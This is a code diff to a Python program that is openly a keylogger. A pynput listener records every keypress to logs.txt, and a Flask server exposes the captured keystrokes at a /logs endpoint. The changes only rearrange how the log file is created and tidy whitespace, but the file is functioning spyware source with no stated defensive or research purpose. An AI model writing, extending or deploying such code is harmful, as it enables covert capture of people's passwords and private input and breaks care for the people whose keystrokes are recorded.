@@ -5,6 +5,10 @@ import os
 
 log_file_path = "logs.txt"
 
+if not os.path.exists(log_file_path):
+    with open(log_file_path, "w") as f:
+        f.write("")
+
 def on_press(key):
     try:
         with open(log_file_path, "a") as f:
@@ -16,7 +20,6 @@ def on_press(key):
 def start_keylogger():
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
-
 
 app = Flask(__name__)
 
@@ -53,17 +56,11 @@ def index():
 
 @app.route("/logs")
 def logs():
-    if not os.path.exists(log_file_path):
-        return jsonify({"data": ""})
     with open(log_file_path, "r") as f:
         content = f.read()
     return jsonify({"data": content})
 
-
 if __name__ == "__main__":
-   
     keylogger_thread = Thread(target=start_keylogger, daemon=True)
     keylogger_thread.start()
-
-   
     app.run(port=5000, debug=False)
